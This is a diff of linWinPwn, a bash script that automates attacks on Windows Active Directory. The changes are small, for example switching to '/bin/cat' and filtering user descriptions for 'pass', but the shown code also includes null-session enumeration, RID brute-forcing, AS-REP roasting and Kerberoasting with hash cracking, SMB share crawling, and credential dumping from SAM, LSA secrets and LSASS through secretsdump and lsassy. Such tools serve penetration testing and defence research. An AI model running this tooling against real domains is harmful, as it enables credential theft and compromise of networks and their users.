@@ -3,7 +3,7 @@
 # linWinPwn - alpha version (https://github.com/lefayjey/linWinPwn)
 # Author: lefayjey
 # Inspired by: S3cur3Th1sSh1t's WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
-# Latest update : 20/01/2022
+# Latest update : 25/01/2022
 #
 #      _        __        ___       ____                 
 #     | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __  
@@ -179,25 +179,25 @@ dns_enum () {
     if [ ! -f "${adidnsdump}" ] ; then
         echo -e "${RED}[-] Please verify the installation of adidnsdump${NC}"
         echo -e ""
-    elif [ ! -f "${dns_records}" ];  then
+    elif [ ! -f "${dns_records}" ]; then
         if [ "${anon_bool}" == true ] ; then
             echo -e "${PURPLE}[-] adidnsdump requires credentials${NC}"
             echo ${dc_ip} >> ${servers_ip_list}
         elif [ "${hash_bool}" == true ] ; then 
             ${adidnsdump} -u ${domain}\\${user} -p ${hash} --dns-tcp ${dc_ip}
             mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv
-            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${servers_ip_list}
-            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "dc\|dns" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${dc_ip_list}
-            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${sql_ip_list}
+            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${servers_ip_list}
+            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "dc\|dns" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${dc_ip_list}
+            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${sql_ip_list}
         elif [ "${kerb_bool}" == true ] ; then
             echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets${NC}"
             echo ${dc_ip} >> ${servers_ip_list}
         else
             ${adidnsdump} -u ${domain}\\${user} -p ${password} --dns-tcp ${dc_ip}
             mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv
-            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${servers_ip_list}
-            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "dc\|dns" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${dc_ip_list}
-            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${sql_ip_list}
+            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${servers_ip_list}
+            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "dc\|dns" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${dc_ip_list}
+            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${sql_ip_list}
         fi
     else
         echo -e "${YELLOW}[i] DNS dump found ${NC}"
@@ -346,10 +346,10 @@ ad_enum () {
         if [ "${anon_bool}" == true ] ; then
             echo -e "${CYAN}[*] rid brute ${NC}"
             ${crackmapexec} smb ${dc_ip} -u ${user} -p "" --rid-brute > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
-            /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2| sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1         
+            /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2| sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] users enum ${NC}"
             ${crackmapexec} smb ${dc_ip} -u "" -p "" --users > ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt
-            /bin/cat ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}" | grep -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt 2>&1         
+            /bin/cat ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}" | grep -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] spooler check ${NC}"
             ${crackmapexec} smb ${dc_ip} -u '' -p '' -M spooler | tee ${output_dir}/DomainRecon/cme_spooler_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] petitpotam check ${NC}"
@@ -357,7 +357,7 @@ ad_enum () {
             echo -e "${CYAN}[*] zerologon check ${NC}"
             ${crackmapexec} smb ${dc_ip} -u '' -p '' -M zerologon | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] mssql_priv check ${NC}"
-            ${crackmapexec} mssql ${sql_ip_list} -u '' -p ''  -M mssql_priv | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} mssql ${sql_ip_list} -u '' -p '' -M mssql_priv | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
         elif [ "${hash_bool}" == true ] ; then
             echo -e "${CYAN}[*] spooler check ${NC}"
             ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -H ${hash} -M spooler | tee ${output_dir}/DomainRecon/cme_spooler_output_${dc_domain}.txt 2>&1
@@ -374,7 +374,8 @@ ad_enum () {
             echo -e "${CYAN}[*] adcs check ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M adcs --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] users description dump ${NC}"
-            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M get-desc-users --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M get-desc-users --kdcHost ${dc_domain} | grep -i "pass" | tee ${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
+            
             echo -e "${CYAN}[*] get MachineAccountQuota ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M MAQ --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] ldap-signing check ${NC}"
@@ -397,14 +398,14 @@ ad_enum () {
             echo -e "${CYAN}[*] adcs check ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M adcs --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] users description dump ${NC}"
-            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M get-desc-users --kdcHost ${dc_domain} | tee${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M get-desc-users --kdcHost ${dc_domain} | grep -i "pass" | tee${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] get MachineAccountQuota ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M MAQ --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] ldap-signing check ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M ldap-signing --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] mssql_priv check ${NC}"
             ${crackmapexec} mssql ${sql_ip_list} -d ${domain} -u ${user} -p '' -k -M mssql_priv | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
-        else
+		else
             echo -e "${CYAN}[*] spooler check ${NC}"
             ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M spooler | tee ${output_dir}/DomainRecon/cme_spooler_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] webdav check ${NC}"
@@ -420,7 +421,7 @@ ad_enum () {
             echo -e "${CYAN}[*] adcs check ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M adcs --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] users description dump ${NC}"
-            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M get-desc-users --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M get-desc-users --kdcHost ${dc_domain} | grep -i "pass" | tee ${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] get MachineAccountQuota ${NC}"
             ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M MAQ --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
             echo -e "${CYAN}[*] ldap-signing check ${NC}"
@@ -451,7 +452,7 @@ ad_enum () {
             if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
                 echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
             fi
-        fi        
+        fi
     fi
     echo -e ""
 
@@ -480,7 +481,7 @@ ad_enum () {
         elif [ "${hash_bool}" == true ] ; then 
             /usr/bin/python3 ${scripts_dir}/LdapRelayScan.py -method BOTH -dc-ip ${dc_ip} -u ${user} -nthash $(echo ${hash} | cut -d ":" -f 2) 2>/dev/null > ${output_dir}/DomainRecon/LdapRelayScan_${dc_domain}.txt
         elif [ "${kerb_bool}" == true ] ; then
-                echo -e "${PURPLE}[-] LdapRelayScan does not support kerberos tickets${NC}"
+            echo -e "${PURPLE}[-] LdapRelayScan does not support kerberos tickets${NC}"
         else
             /usr/bin/python3 ${scripts_dir}/LdapRelayScan.py -method BOTH -dc-ip ${dc_ip} -u ${user} -p ${password} 2>/dev/null > ${output_dir}/DomainRecon/LdapRelayScan_${dc_domain}.txt
         fi
@@ -490,24 +491,24 @@ ad_enum () {
 
 kerberos () {
     echo -e "${BLUE}[*] kerbrute Usernames${NC}"
-    if [ ! -f "${kerbrute}" ] ;  then
+    if [ ! -f "${kerbrute}" ] ; then
         echo -e "${RED}[-] Please verify the installation of kerbrute${NC}"
     else
         if [ "${anon_bool}" == true ] ; then
             echo -e "${YELLOW}[i] Using $users_list wordlist for user enumeration${NC}"
             ${kerbrute} -users ${users_list} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -outputusers ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt | tee ${output_dir}/Kerberoast/kerbrute_output_${dc_domain}.txt 2>&1
-        fi        
+        fi
     fi
     echo -e ""
     
     echo -e "${BLUE}[*] AS REP Roasting Attack${NC}"
-    if [ ! -f "${impacket_dir}/GetNPUsers.py" ] ;  then
+    if [ ! -f "${impacket_dir}/GetNPUsers.py" ] ; then
         echo -e "${RED}[-] Please verify the installation of impacket${NC}"
     else
         if [[ "${dc_domain}" != "${domain}" ]] || [ "${anon_bool}" == true ] ; then
             known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
             /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf | tee ${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt 2>&1
-            if [ -s "${known_users_list}" ] ;  then
+            if [ -s "${known_users_list}" ] ; then
                 users_list=${known_users_list}
             fi
             /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${dc_domain}/ -usersfile ${users_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt 2>&1
@@ -515,7 +516,7 @@ kerberos () {
             /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip}
             /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
         elif [ "${kerb_bool}" == true ] ; then
-            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip}        
+            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip}
             /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
         else
             /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -dc-ip ${dc_ip}
@@ -531,7 +532,7 @@ kerberos () {
     echo -e ""
 
     echo -e "${BLUE}[*] Kerberoast Attack${NC}"
-    if [ ! -f "${impacket_dir}/GetUserSPNs.py" ] ;  then
+    if [ ! -f "${impacket_dir}/GetUserSPNs.py" ] ; then
         echo -e "${RED}[-] Please verify the installation of impacket${NC}"
     else
         if [ "${anon_bool}" == true ] ; then
@@ -550,14 +551,14 @@ kerberos () {
             if grep -q 'error' ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt; then
                 echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
             else
-                /bin/cat ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/'  > ${output_dir}/Kerberoast/kerberoast_hashes_${dc_domain}.txt
-                fi
+                /bin/cat ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberoast/kerberoast_hashes_${dc_domain}.txt
+            fi
         fi
     fi
     echo -e ""
     
     echo -e "${BLUE}[*] Cracking Kerberoast hashes using john the ripper${NC}"
-    if [ ! -f "${john}" ] ;  then
+    if [ ! -f "${john}" ] ; then
         echo -e "${RED}[-] Please verify the installation of john${NC}"
     else
         echo -e "${CYAN}[*] Launching john on collected kerberoast hashes...${NC}"
@@ -587,11 +588,11 @@ kerberos () {
 
 scan_servers () {
     echo -e "${BLUE}[*] nmap scan on port 445 ${NC}"
-    if [ ! -f "${nmap}" ];  then
+    if [ ! -f "${nmap}" ]; then
         echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
     else
         servers_smb_list="${output_dir}/Scans/servers_list_smb_${dc_domain}.txt"
-        if [ ! -f "${servers_smb_list}" ];  then
+        if [ ! -f "${servers_smb_list}" ]; then
             ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt 1>/dev/null 2>&1
             grep -a "open" ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
         else
@@ -627,18 +628,18 @@ scan_servers () {
     echo -e ""
 
     echo -e "${BLUE}[*] SMB shares enum${NC}"
-    if [ ! -f "${smbmap}" ];  then
+    if [ ! -f "${smbmap}" ]; then
         echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
     else
         echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
-        for i in $(cat ${servers_smb_list}); do
+        for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
             if [ "${anon_bool}" == true ] ; then
                 ${smbmap} -H $i -u ${user} -p "" -d ${dc_domain} | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_${i}.txt 2>&1
             elif [ "${hash_bool}" == true ] ; then
                 ${smbmap} -H $i -u ${user} -p ${hash} -d ${domain} | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_${i}.txt 2>&1
             elif [ "${kerb_bool}" == true ] ; then
-                echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"       
+                echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
             else
                 ${smbmap} -H $i -u ${user} -p ${password} -d ${domain} | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_${i}.txt 2>&1
             fi
@@ -648,14 +649,14 @@ scan_servers () {
         grep -iaH READ ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' > ${output_dir}/Scans/all_network_shares_${dc_domain}.txt
 
         echo -e "${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}"
-        for i in $(cat ${servers_smb_list}); do
+        for i in $(/bin/cat ${servers_smb_list}); do
         echo -e "${CYAN}[*] Listing files in accessible shares on ${i} ${NC}"
         if [ "${anon_bool}" == true ] ; then
             ${smbmap} -H $i -u ${user} -p "" -d ${dc_domain} -g -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_files_${dc_domain}_${i}.txt 2>&1
         elif [ "${hash_bool}" == true ] ; then
             ${smbmap} -H $i -u ${user} -p ${hash} -d ${domain} -g -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_files_${dc_domain}_${i}.txt 2>&1
         elif [ "${kerb_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"    
+            echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
         else
             ${smbmap} -H $i -u ${user} -p ${password} -d ${domain} -g -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_files_${dc_domain}_${i}.txt 2>&1
         fi
@@ -666,13 +667,13 @@ scan_servers () {
 
 pwd_dump () { 
     echo -e "${BLUE}[*] nmap scan on port 445 ${NC}"
-    if [ ! -f "${nmap}" ];  then
+    if [ ! -f "${nmap}" ]; then
         echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
     else
         if [ -z "${servers_list}" ] ; then
             echo -e "${YELLOW}[i] Servers list not provided, dumping passwords on all domain servers ${NC}"
-            servers_smb_list="${output_dir}/Scans/servers_list_smb_${dc_domain}.txt"  
-            if [ ! -f "${servers_smb_list}" ];  then
+            servers_smb_list="${output_dir}/Scans/servers_list_smb_${dc_domain}.txt"
+            if [ ! -f "${servers_smb_list}" ]; then
                 ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt 1>/dev/null 2>&1
                 grep -a "open" ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
             else
@@ -680,7 +681,7 @@ pwd_dump () {
             fi
         else
             servers_ip_list="${servers_list}"
-            servers_smb_list="${output_dir}/Scans/servers_custom_list_smb_${dc_domain}.txt"  
+            servers_smb_list="${output_dir}/Scans/servers_custom_list_smb_${dc_domain}.txt"
             ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
             grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
         fi
@@ -689,10 +690,10 @@ pwd_dump () {
     
     ## Dump credentials from SAM, SYSTEM and LSA secrets
     echo -e "${BLUE}[*] Dump creds using secretsdump ${NC}"
-    if [ ! -f "${impacket_dir}/secretsdump.py" ] ;  then
+    if [ ! -f "${impacket_dir}/secretsdump.py" ] ; then
         echo -e "${RED}[-] Please verify the installation of impacket${NC}"
     else
-        for i in $(cat ${servers_smb_list}); do
+        for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
             if [ "${anon_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] secretsdump requires credentials${NC}"
@@ -715,10 +716,10 @@ pwd_dump () {
     ## Dump credentials from LSASS
     echo -e "${BLUE}[*] Dump creds using lsassy ${NC}"
     if [ "${lsassy_bool}" == true ] ; then
-        if [ ! -f "${lsassy}" ] ;  then
+        if [ ! -f "${lsassy}" ] ; then
             echo -e "${RED}[-] Please verify the installation of lsassy${NC}"
         else
-            for i in $(cat ${servers_smb_list}); do
+            for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] lsass dump of ${i} ${NC}"
                 if [ "${anon_bool}" == true ] ; then
                     echo -e "${PURPLE}[-] lsass dump requires credentials${NC}"
